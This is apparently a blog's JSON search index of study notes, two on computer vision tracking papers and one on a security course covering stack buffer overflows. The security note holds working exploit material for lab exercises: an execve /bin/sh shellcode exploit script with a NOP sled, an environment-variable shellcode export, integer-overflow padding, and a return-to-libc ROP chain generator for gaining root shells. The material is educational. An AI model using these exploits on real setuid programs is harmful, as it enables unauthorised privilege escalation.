[{"categories":["科研学习"],"content":"CV 论文《Learning Spatio-Temporal Transformer for Visual Tracking》笔记 ","date":"2023-08-10","objectID":"/posts/stark/:0:0","tags":["CV","论文","笔记"],"title":"《Learning Spatio-Temporal Transformer for Visual Tracking》论文阅读笔记","uri":"/posts/stark/"},{"categories":["科研学习"],"content":"Abstract 本文提出了一个基于 encoder-decoder transformer 架构的目标跟踪网络，其中 encoder 用于对目标对象和搜索区域的全局时间特征和空间特征关系进行建模，decoder 用于预测目标对象的位置。在预测阶段仅使用一个 FCN 用于预测 bounding box 的两个端点。整个过程是端到端的，效率和测试表现均达到 SOTA。 ","date":"2023-08-10","objectID":"/posts/stark/:1:0","tags":["CV","论文","笔记"],"title":"《Learning Spatio-Temporal Transformer for Visual Tracking》论文阅读笔记","uri":"/posts/stark/"},{"categories":["科研学习"],"content":"A Simple Baseline Based on Transformer 文章首先提出了一个仅考虑空间信息的 Baseline。 ","date":"2023-08-10","objectID":"/posts/stark/:2:0","tags":["CV","论文","笔记"],"title":"《Learning Spatio-Temporal Transformer for Visual Tracking》论文阅读笔记","uri":"/posts/stark/"},{"categories":["科研学习"],"content":"Backbone 使用 vanilla ResNet 作为 backbone 分别提取 search 和 template 的特征。输入 template 图像 $z\\in \\mathbb R ^{3\\times H_z\\times W_z}$ 和 search 图像 $x\\in \\mathbb R ^{3\\times H_x\\times W_x}$，经过 backbone 得到特征图 $f_z \\in \\mathbb R ^{C\\times \\frac{H_z}{s}\\times \\frac{W_z}{s}}$，$f_x \\in \\mathbb R ^{C\\times \\frac{H_x}{s}\\times \\frac{W_x}{s}}$。 ","date":"2023-08-10","objectID":"/posts/stark/:2:1","tags":["CV","论文","笔记"],"title":"《Learning Spatio-Temporal Transformer for Visual Tracking》论文阅读笔记","uri":"/posts/stark/"},{"categories":["科研学习"],"content":"Encoder Adjust 得到特征图后通过一层网络将通道数 $C$ 降为 $d$，之后将后两维展开，得到 $f_z’ \\in \\mathbb R ^{d\\times \\frac{H_zW_z}{s^2}}$，$f_x’ \\in \\mathbb R ^{d\\times \\frac{H_xW_x}{s^2}}$；将 template 和 search 拼接，得到 $(d, \\frac{H_zW_z}{s^2}+\\frac{H_xW_x}{s^2})$ 的 token 序列。 原理分析 之后直接将向量序列嵌入位置信息后送入 encoder 层。可以通过一篇较新的论文 OSTrack 中的公式了解原理。根据 self-attention 的公式，有： $$ A=\\mathrm{Softmax} \\left(\\frac{QK^\\top}{\\sqrt{d_k}}\\right)\\cdot V = \\mathrm{Softmax} \\left(\\frac{[Q_z;Q_x][K_z;K_x]^\\top}{\\sqrt{d_k}}\\right)\\cdot [V_z;V_x] $$ 令 $W_{zx}= \\mathrm{Softmax} \\left( \\frac{Q_z{K}_x^\\top}{\\sqrt{d_k}}\\right)$，表示模板和搜索区域间相似度的度量，其余同理，将上式展开，有 $$ A=[W_{zz},W_{zx}; W_{xz},W_{xx}]\\cdot (V_z;V_x)=[W_{zz}V_z+W_{zx}V_x;W_{xz}V_z+W_{xx}V_x] $$ 其中 $W_{xz}V_z$ 对模板和搜索区域在空间上的联系进行建模，而 $W_{xx}V_x$ 基于图像全局提取了搜索区域的特征。因此特征提取和关系建模经由一次 self-attention 操作即可完成。 ","date":"2023-08-10","objectID":"/posts/stark/:2:2","tags":["CV","论文","笔记"],"title":"《Learning Spatio-Temporal Transformer for Visual Tracking》论文阅读笔记","uri":"/posts/stark/"},{"categories":["科研学习"],"content":"Decoder 将一个 target query 和 encoder 的输出送入 decoder，得到预测目标位置的一个一维向量，用于后续预测 bounding box。论文的 decoder 部分写的较为简略，说沿用了 DETR 的设计，只是将 query 个数减少为 1。 ","date":"2023-08-10","objectID":"/posts/stark/:2:3","tags":["CV","论文","笔记"],"title":"《Learning Spatio-Temporal Transformer for Visual Tracking》论文阅读笔记","uri":"/posts/stark/"},{"categories":["科研学习"],"content":"Head 如图。首先将特征序列点乘 decoder 的输出得到模板和搜索区域的相似度向量，再与原特征序列相乘得到最终的特征序列。 关于 decoder 部分 作者在 STARK-ExtreMart 中分析得出该部分实际上仅等价于一个空间注意力模块，为了学习一个简单的空间注意力而使用 6 层 decoder 层是非必要的。实验也证明在 STARK-S 中去掉该部分对指标影响很小且优化了模型的性能和参数。 作者后来在模型的优化中就直接去掉了 decoder 模块。如下图是 STARK-Lighting（基于 STARK-S 进行优化后得到的高效模型）的网络结构： 将特征序列展开成特征图 $f\\in \\mathbb R^{d\\times \\frac{H_s}{s}\\times \\frac{W_s}{s}}$，并送入 FCN，得到两张概率图 $P_{tl}(x,y), P_{br}(x,y)$，分别用于预测 bounding box 的左上角和右下角的坐标。将概率图的概率分布期望作为预测坐标，即 $$ (\\hat{x_{tl}}, \\hat{y_{tl}})=(\\sum_{y=0}^H \\sum_{x=0}^W x\\cdot P_{tl}(x,y), \\sum_{y=0}^H \\sum_{x=0}^W y\\cdot P_{tl}(x,y)) $$ （上述为左上，右下同理） 训练部分，损失函数仅包含 $l_1$ Loss 和 IoU Loss，不包含分类的损失： $$ L=\\lambda_{iou}L_{iou}(b_i,\\hat{b_i})+\\lambda_{L_1}L_1(b_i,\\hat{b_i}) $$ ","date":"2023-08-10","objectID":"/posts/stark/:2:4","tags":["CV","论文","笔记"],"title":"《Learning Spatio-Temporal Transformer for Visual Tracking》论文阅读笔记","uri":"/posts/stark/"},{"categories":["科研学习"],"content":"Spatio-Temporal Transformer Tracking 基于上面的 baseline，考虑将时序信息也用于建模。这里主要通过适时加入当前帧的模板信息来实现。 ","date":"2023-08-10","objectID":"/posts/stark/:3:0","tags":["CV","论文","笔记"],"title":"《Learning Spatio-Temporal Transformer for Visual Tracking》论文阅读笔记","uri":"/posts/stark/"},{"categories":["科研学习"],"content":"Input 与前面的 baseline 仅输入第一帧信息作为模板和当前帧作为搜索区域不同，新的方法从中间帧引入动态更新的模板作为附加输入，以提供额外的时序信息。 实现与前面一样，直接将三个输入拼接起来即可。 ","date":"2023-08-10","objectID":"/posts/stark/:3:1","tags":["CV","论文","笔记"],"title":"《Learning Spatio-Temporal Transformer for Visual Tracking》论文阅读笔记","uri":"/posts/stark/"},{"categories":["科研学习"],"content":"Head 目标跟踪时当目标被遮挡或丢失时不应更新动态模板。为简化问题，文章认为只要搜索区域包含目标就可以更新动态模板。所以文章添加了一个简单的 Score Head，包含三层感知机和一个 sigmoid 激活函数，若当前状态得分高于阈值则更新动态模板。 ","date":"2023-08-10","objectID":"/posts/stark/:3:2","tags":["CV","论文","笔记"],"title":"《Learning Spatio-Temporal Transformer for Visual Tracking》论文阅读笔记","uri":"/posts/stark/"},{"categories":["科研学习"],"content":"Train 在这里引入分类任务，但将定位和分类分开进行。将训练划分为两个阶段，第一阶段训练除了 Score Head 以外的部分，在保证搜索区域包含目标对象的前提下学习定位。在二阶段仅训练 Score Head，使用交叉熵作为 Loss： $$ L_{ce}=y_i\\log(P_i)+(1-y_i)\\log(1-P_i) $$ 其中 $y_i$ 是 groundtruth 标注，$P_i$ 是预测的置信度。在训练 Score Head 时冻结其余参数，防止影响定位部分。 初始时动态模板为第一帧的模板。当上一次更新距当前帧至少 $T_u$ 帧且 Score Head 给出的分数大于给定阈值，则从当前帧裁剪出新的动态模板作为输入。 ","date":"2023-08-10","objectID":"/posts/stark/:3:3","tags":["CV","论文","笔记"],"title":"《Learning Spatio-Temporal Transformer for Visual Tracking》论文阅读笔记","uri":"/posts/stark/"},{"categories":["科研学习"],"content":"CV 论文《Cross-Modal Object Tracking: Modality-Aware Representations and A Unified Benchmark》笔记 ","date":"2023-08-04","objectID":"/posts/crossmodel/:0:0","tags":["CV","论文","笔记"],"title":"《Cross-Modal Object Tracking ...》 论文阅读笔记","uri":"/posts/crossmodel/"},{"categories":["科研学习"],"content":"背景 现有的目标跟踪方法大多基于 RGB 图像序列，然而这些方法在低光环境下存在局限性。现有的引入深度（RGB-D）或热成像（RGB-T）的方法由于需要对平台设计要求高，无法得到广泛应用。 许多监控摄像机包含近红外成像（NIR），在高光和低光环境下会分别切换为 RGB 成像和 NIR 成像（如题图）。两个模态特征差异大，为跟踪任务带来巨大挑战。本文主要尝试设计可嵌入式的网络解决减小两个模态数据的差异，并构建该类跨模态目标跟踪问题的 benchmark。 ","date":"2023-08-04","objectID":"/posts/crossmodel/:1:0","tags":["CV","论文","笔记"],"title":"《Cross-Modal Object Tracking ...》 论文阅读笔记","uri":"/posts/crossmodel/"},{"categories":["科研学习"],"content":"贡献点 提出一个新的具有挑战性和实践价值的任务：跨模态目标跟踪； 提出一个算法 MArMOT(Modality-Aware cross-Modal Object Tracking algorithm)，用于减小两个模态图像之间的特征差异。该算法即插即用，可以方便嵌入各种主流跟踪算法框架。 提出了一个“三步训练法”有效训练跨模态的目标跟踪网络。 创建了一个跨模态目标跟踪问题的 benchmark 和对应的数据集，并通过实验证明上述方法有效。 ","date":"2023-08-04","objectID":"/posts/crossmodel/:2:0","tags":["CV","论文","笔记"],"title":"《Cross-Modal Object Tracking ...》 论文阅读笔记","uri":"/posts/crossmodel/"},{"categories":["科研学习"],"content":"MArMOT 模型 该模型结构如下： 模型经过 backbone 后首先通过两个并行的分支，用于学习目标在不同模态下的模态独立特征（modality-specific representation）。每个分支采用类似 Inception Net 的结构。具体原理待学习。 之后使用 SKNet 融合两个特征。这里只用到 SKNet 后面的 Fuse 和 Select。 将该网络插入各主流目标检测框架后实验验证得到两个模态的特征差异确实减小。 ","date":"2023-08-04","objectID":"/posts/crossmodel/:3:0","tags":["CV","论文","笔记"],"title":"《Cross-Modal Object Tracking ...》 论文阅读笔记","uri":"/posts/crossmodel/"},{"categories":["科研学习"],"content":"“三步训练法” 直接将 baseline 在数据集上微调。（此前 baseline 要在其他数据集上训练好） 分别将对应模态的图像送往对应的分支进行训练。 训练 SKNet 层并再次微调 baseline 模型。 ","date":"2023-08-04","objectID":"/posts/crossmodel/:4:0","tags":["CV","论文","笔记"],"title":"《Cross-Modal Object Tracking ...》 论文阅读笔记","uri":"/posts/crossmodel/"},{"categories":["科研学习"],"content":"CMOTB Benchmark 提供了一个名为 CMOTB 的跨模态目标识别数据集。此部分暂略。 ","date":"2023-08-04","objectID":"/posts/crossmodel/:5:0","tags":["CV","论文","笔记"],"title":"《Cross-Modal Object Tracking ...》 论文阅读笔记","uri":"/posts/crossmodel/"},{"categories":["科研学习"],"content":"实验 待填坑 QwQ ","date":"2023-08-04","objectID":"/posts/crossmodel/:6:0","tags":["CV","论文","笔记"],"title":"《Cross-Modal Object Tracking ...》 论文阅读笔记","uri":"/posts/crossmodel/"},{"categories":["专业课"],"content":"本文浅谈《漏洞分析》课程中几个常见的栈溢出相关的题型。 ","date":"2023-08-04","objectID":"/posts/vul1/:0:0","tags":["信息安全","笔记"],"title":"漏洞分析：缓冲区溢出","uri":"/posts/vul1/"},{"categories":["专业课"],"content":"1. 栈帧结构与函数调用过程 在介绍栈溢出前，我们有必要了解一下栈帧的结构与函数调用与返回的这两个重要的过程。 每个运行的函数都会在栈上分配一段独立的区域，即为栈帧（Stack Frame）。栈帧存放了函数的返回地址和参数、临时变量、变量函数调用的上下文等。栈由高地址向低地址延申。栈指针 sp 指向栈底，存放在寄存器 ebp；帧指针 fp 指向栈顶，存放在寄存器 esp。具体栈帧结构和函数调用、返回的过程如下： 在调用函数前，程序会先将函数的参数逐一压栈，然后执行 call：call 语句会先将返回地址压栈（返回地址即被调用函数运行结束后跳转到的地址），然后 jmp 到被调用函数。之后程序回味被调用的函数开辟一个新的栈帧，创建栈帧过程如上图所示。 在被调用函数运行完毕后，程序会执行返回操作，释放开辟的栈帧，过程如上图所示。在执行完毕后，程序会跳转到返回地址。 注：下图与上图栈的顺序不太一样 ","date":"2023-08-04","objectID":"/posts/vul1/:1:0","tags":["信息安全","笔记"],"title":"漏洞分析：缓冲区溢出","uri":"/posts/vul1/"},{"categories":["专业课"],"content":"2. 栈溢出攻击基本原理 由前文可知，栈是由高地址向低地址延申的，这意味着在不开启堆栈保护的前提下，我们被调用函数的栈帧的地址是在返回地址之上的。 众所周知，函数内的局部变量都是定义在栈帧中的。例如如下一个人畜无害的字符数组，栈帧会给它开辟一个233个字节的内存空间： char buf[233];而众所周知，数组中的元素存放的地址都是从低到高的。不考虑任何的保护措施，假设我们往这个数组里塞超过其长度的内容，那么多出的内容就会覆盖栈帧的其他部分——直到将栈帧填满。此时再塞更长的内容就会覆盖函数的返回地址以及更高地址的内容。 栈溢出攻击的基本原理十分的简单，就是通过溢出这样的字符数组来覆写返回地址，使程序跳转到恶意代码（如包含提权 shellcode 的环境变量）或函数。 ","date":"2023-08-04","objectID":"/posts/vul1/:2:0","tags":["信息安全","笔记"],"title":"漏洞分析：缓冲区溢出","uri":"/posts/vul1/"},{"categories":["专业课"],"content":"3. 栈溢出攻击的基本类型与技巧概述 注意：本文仅探讨关闭 GCC 的栈保护（-fno-stack-protector）的栈溢出 除了 GCC 的栈保护，编译器还提供以下两种栈保护： 栈地址随机化：在linux下通过命令 sysctl -w kernel.randomize_va_space=2 开启（默认开启，0即为关闭）。开启后运行的程序的栈帧会随机分配地址。 不可执行栈：通过在编译命令中加入 -z noexecstack 开启不可执行栈。开启后将无法在栈内执行代码，避免了将程序跳转执行恶意 shellcode 的可能。 针对不同的保护策略，有如下不同的攻击策略，概述如下： 栈溢出保护 做法 无保护 直接覆盖返回地址为root shell 不可执行栈 Return to Libc 栈地址随机化 JMP ESP / 覆写函数指针 （两个同时开启暂时不可做） 对于程序中显著存在的缓冲区漏洞（例如不判断字符串长度直接向字符数组写入可能超过其长度的字符串）我们显然可以直接利用。当然程序中可能会存在一些长度判断语句。如果给定的长度是无符号整数，我们可以善用整数溢出来实现缓冲区溢出攻击。 接下来介绍通过缓冲区溢出，攻击各种保护下的 Set-UID 程序。 ","date":"2023-08-04","objectID":"/posts/vul1/:3:0","tags":["信息安全","笔记"],"title":"漏洞分析：缓冲区溢出","uri":"/posts/vul1/"},{"categories":["专业课"],"content":"4. 无栈保护：return to rootshell 在不开启任何栈保护的情况下，最简单的方法就是直接利用前文栈溢出攻击的原理，将返回地址覆盖为 root shell 的地址。 下面通过一个具体的实例展现栈溢出攻击的过程： ","date":"2023-08-04","objectID":"/posts/vul1/:4:0","tags":["信息安全","笔记"],"title":"漏洞分析：缓冲区溢出","uri":"/posts/vul1/"},{"categories":["专业课"],"content":"4.1 栈溢出例题1 （展开代码以查看漏洞程序） /* stack.c */ /* This program has a buffer overflow vulnerability. */ /* Our task is to exploit this vulnerability */ #include \u003cstdlib.h\u003e #include \u003cstdio.h\u003e #include \u003cstring.h\u003e int bof(char *str) { char buffer[24]; /* The following statement has a buffer overflow problem */ strcpy(buffer, str); return 1; } int main(int argc, char **argv) { char str[517]; FILE *badfile; badfile = fopen(\"badfile\", \"r\"); fread(str, sizeof(char), 517, badfile); bof(str); printf(\"Returned Properly\\n\"); return 1; }使用 GDB 对该漏洞程序进行反汇编： 在这里可以看到执行完 bof 函数后的地址为 0x080404ff，即为 bof 函数的返回地址。 对 bof 函数进行反汇编： 向 Badfile 中写入数据 AAAA，以便后续观察 buffer 在栈中的位置（图略）； 然后使用 GDB 在 bof 函数的 leave 处（0x080484a1）处设置断点，并查看栈内元素： 可以发现buffer的起始地址与返回地址 0x080404ff 中间相隔 9*4=36 个字节。 接下来我们需要让 buffer 溢出，并在原来存放返回地址的位置写入恶意代码的地址。 由于在 GDB 中运行得到的 bof 函数的栈帧地址可能与直接运行时不同。我们可以通过填充 NOP 指令为恶意代码创建大量入口点。使用 NOP 填充使得我们不需要精确预测恶意代码被存放的地址，而只要保证写入的地址能藉由NOP“滑到”恶意代码。 攻击程序的 Python 代码如下： import sys shellcode = ( \"\\x31\\xc0\" # xorl %eax,%eax \"\\x50\" # pushl %eax \"\\x68\"\"//sh\" # pushl $0x68732f2f \"\\x68\"\"/bin\" # pushl $0x6e69622f \"\\x89\\xe3\" # movl %esp,%ebx \"\\x50\" # pushl %eax \"\\x53\" # pushl %ebx \"\\x89\\xe1\" # movl %esp,%ecx \"\\x99\" # cdq \"\\xb0\\x0b\" # movb $0x0b,%al \"\\xcd\\x80\" # int $0x80 ).encode('latin-1') length = 517 buf = bytearray(0x90 for i in range(length)) shell_start = length - len(shellcode) buf[shell_start:] = shellcode for i in range(36): buf[i] = 0x41 ret = 0xbffff110 + 200 buf[36:40] = (ret).to_bytes(4, byteorder='little') File = open(\"badfile\", \"wb\") File.write(buf) File.close()首先向字符串填充 NOP，然后在最末端插入提权 shellcode。由前面可知，我们需要先填充 36 个字节到达返回地址，并将返回地址修改为能到达恶意代码的入口地址即可。 这里写入的地址ret比较随意，只要保证在NOP的区间内即可，可选地址区间很大。 运行 exploit.py 生成攻击缓冲区的字符串 badfile，然后运行程序 stack。 可以看到攻击成功。 ","date":"2023-08-04","objectID":"/posts/vul1/:4:1","tags":["信息安全","笔记"],"title":"漏洞分析：缓冲区溢出","uri":"/posts/vul1/"},{"categories":["专业课"],"content":"4.2 将提权 shell 插入环境变量 我们可以先将写好的 shell 放在环境变量中，然后通过程序得到环境变量的地址。我们直接将返回地址覆盖为该环境变量的地址即可。 使用如下命令创建提权 shell 环境变量： export EGG=$(python -c \"print '\\x90'*1000 + '\\x6a\\x17\\x58\\x31\\xdb\\xcd\\x80\\x6a\\x0b\\x58\\x99\\x52\\x68//sh\\x68/bin\\x89\\xe3\\x52\\x53\\x89\\xe1\\xcd\\x80'\")上述 shell 对应的汇编代码如下： setuid(0)\r8049380: 6a 17 push $0x17\r8049382: 58 pop %eax\r8049383: 31 db xor %ebx,%ebx\r8049385: cd 80 int $0x80\rexecve(\"/bin//sh\", [\"/bin//sh\"], NULL)\r8049387: 6a 0b push $0xb\r8049389: 58 pop %eax\r804938a: 99 cltd 804938b: 52 push %edx\r804938c: 68 2f 2f 73 68 push $0x68732f2f\r8049391: 68 2f 62 69 6e push $0x6e69622f\r8049396: 89 e3 mov %esp,%ebx\r8049398: 52 push %edx\r8049399: 53 push %ebx\r804939a: 89 e1 mov %esp,%ecx\r804939c: cd 80 int $0x80可以通过编写C程序得到创建的环境变量的地址。注意：环境变量地址会根据程序文件名进行偏移。故编写的程序应和待攻击程序的文件名长度一致，这样得到的环境变量地址也是一致的，否则需要计算地址的偏移。 //export EGG=$(python -c \"print '\\x90'*1000 + '\\x6a\\x17\\x58\\x31\\xdb\\xcd\\x80\\x6a\\x0b\\x58\\x99\\x52\\x68//sh\\x68/bin\\x89\\xe3\\x52\\x53\\x89\\xe1\\xcd\\x80'\") #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e int main(void) { printf(\"Egg address: %p \",getenv(\"EGG\")); }由于未开启栈地址随机化，所以环境变量的地址不会改变。需要注意的是，如果题目的代码预先清空了所有的环境变量，则该方法不能使用。 ","date":"2023-08-04","objectID":"/posts/vul1/:4:2","tags":["信息安全","笔记"],"title":"漏洞分析：缓冲区溢出","uri":"/posts/vul1/"},{"categories":["专业课"],"content":"4.3 栈溢出例题2 （展开代码以查看漏洞程序） //q1.c #include \u003cstdio.h\u003e #include \u003cstring.h\u003e #include \u003cstdlib.h\u003e void store_passwd_indb(char* passwd) { } void validate_uname(char* uname) { } void validate_passwd(char* passwd) { char passwd_buf[11]; unsigned char passwd_len = strlen(passwd); if(passwd_len \u003e= 4 \u0026\u0026 passwd_len \u003c= 8) { printf(\"Valid Password\\n\"); fflush(stdout); strcpy(passwd_buf,passwd); } else { printf(\"Invalid Password\\n\"); fflush(stdout); } store_passwd_indb(passwd_buf); } int main(int argc, char* argv[image]) { if(argc!=3) { printf(\"Usage Error: \\n\"); fflush(stdout); exit(-1); } validate_uname(argv[1]); validate_passwd(argv[2]); return 0; }首先按上面的方法，创建root shell的环境变量，并得到其地址为0xbffff293 用与上题相同的方法，通过 gdb 得到字符数组与返回地址间差24个字节。 注意到程序中有对输入字符串的长度进行判断的语句。此时就要利用前文提到的整数溢出：unsigned char 的范围为 [0,255]，只需要使其溢出超过 255 后的值落在条件区间即可。一种简单的方式为在返回地址后补无关字符。 这里在覆盖返回地址后补了 236 个 A，使得字符串总长为 24+4+236=264，溢出后为 264-256=8，正好符合条件。可以看到成功得到了 root shell。 ","date":"2023-08-04","objectID":"/posts/vul1/:4:3","tags":["信息安全","笔记"],"title":"漏洞分析：缓冲区溢出","uri":"/posts/vul1/"},{"categories":["专业课"],"content":"5. 不可执行栈：Return-to-Libc 当开启可执行栈时，我们可以使程序跳转执行提权 shell，但关闭可执行栈后我们就无法这么做了。这时候我们可以通过 ROP（返回导向编程）实现攻击。 ROP 的原理也比较简单。我们的 C 语言程序运行时都会链接 libc 的库函数，这些库函数的地址都会存放在程序中。我们可以通过将返回地址覆盖到这些库函数的上，达到提权等攻击的目的。 我们仅需一个题目，即可了解这种攻击方法的原理与过程： ","date":"2023-08-04","objectID":"/posts/vul1/:5:0","tags":["信息安全","笔记"],"title":"漏洞分析：缓冲区溢出","uri":"/posts/vul1/"},{"categories":["专业课"],"content":"5.1 栈溢出例题3 （展开代码以查看漏洞程序） /* This program has a buffer overflow vulnerability. */ /* Our task is to exploit this vulnerability */ #include \u003cstdlib.h\u003e #include \u003cstdio.h\u003e #include \u003cstring.h\u003e int bof(FILE *badfile) { char buffer[154]; /* The following statement has a buffer overflow problem */ fread(buffer, sizeof(char), 400, badfile); return 1; } int main(int argc, char **argv) { FILE *badfile; badfile = fopen(\"badfile\", \"r\"); bof(badfile); printf(\"Returned Properly\\n\"); fclose(badfile); return 1; }我们的目标是执行以下四个函数： system(\"echo E421140XX\"); setreuid(0,0); system(\"/bin/sh\"); exit(0)首先老办法：向 badfile 中输入 AAAA，使用 GDB 在 bof 函数的 leave 处设断点，查看栈内元素： 可以看到buffer首地址到返回地址之间的距离为 $41\\times 4+2=166$ 个字节。接下来考虑解决题目的要求。 首先需要介绍构造 ROP 链的相关原理。在前面我们已经知道函数被调用的过程：先将参数压栈，再将返回地址压栈，然后开辟新的栈帧。故设函数入口地址为 $x$，则返回地址为 $x+4$，第一个参数地址则为 $x+8$。 我们尝试构造这样一个 ROP 链，使得程序能够连续执行给定的四个函数。 构造的ROP链在栈中存放形式大致如下： 这里的 x 即为原函数（bof）返回地址的位置。可以看到 system 的参数存放在 x+8 的位置。 我们需要在程序中找一个 pop-ret 的片段作为 rop 链函数的返回地址。例如在第一个 system() 执行完毕后 ret，会弹出 x+4 并跳转其存放的地址，即 pop-ret 的片段。首先执行 pop 弹出 system 的参数，然后执行 ret，跳转到 x+12 存放的地址，即执行 setreuid()。 使用 objdump –d 命令反汇编漏洞程序，查看程序完整的汇编代码，从中找 pop,ret 片段。 如图，可以使用 0x804856f 作为 pop,ret 弹出一个参数后返回，使用 0x804856e 作为 pop,pop,ret 弹出两个参数后返回。 定义需要的字符串的环境变量并得到其地址： 并使用 GDB 得到需要的 libc 函数的地址： 使用以下程序生成 badfile： #include \u003cstdlib.h\u003e #include \u003cstdio.h\u003e #include \u003cstring.h\u003e int addr[image] = { 0xb7e5f430 , // system() 0x0804856f , // pop-ret 0xbffff688 , // e1=\"echo E421140XX\" 0xb7f07870 , // setreuid() 0x0804856e , // pop-pop-ret 0, 0, 0xb7e5f430 , // system() 0x0804856f , // pop-ret 0xbffff67d , // e2=\"/bin/sh\" 0xb7e52fb0 , // exit 0 }, cnt = 12; int main(int argc, char **argv) { char buf[300]; memset(buf, 'A', sizeof(buf)); FILE *badfile; badfile = fopen(\"./badfile\", \"w\"); int x = 166, i; for (i = 0; i \u003c cnt; ++i) *(long *) \u0026buf[x + 4*i] = addr[i]; fwrite(buf, sizeof(buf), 1, badfile); fclose(badfile); }编译运行，成功得到 root shell。 ","date":"2023-08-04","objectID":"/posts/vul1/:5:1","tags":["信息安全","笔记"],"title":"漏洞分析：缓冲区溢出","uri":"/posts/vul1/"},{"categories":["专业课"],"content":"6. 地址随机化：JMP ESP 如果开启了随机化，我们可以通过将返回地址覆写为 jmp esp，这样程序仍会停留在原先 esp 的位置上。我们紧随其后写入提权 shellcode 即可使实现攻击。 详细原理和例题先咕着 QwQ。 ","date":"2023-08-04","objectID":"/posts/vul1/:6:0","tags":["信息安全","笔记"],"title":"漏洞分析：缓冲区溢出","uri":"/posts/vul1/"}]